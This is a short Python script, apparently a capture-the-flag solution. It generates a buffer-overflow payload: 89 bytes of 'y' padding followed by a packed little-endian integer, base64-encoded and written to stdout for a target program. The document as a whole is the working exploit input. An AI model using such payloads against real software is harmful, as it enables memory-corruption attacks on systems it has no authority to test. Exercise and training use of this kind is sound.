
import sys
import struct
import base64

buf = b'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
buf += struct.pack('<I', 616170606)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
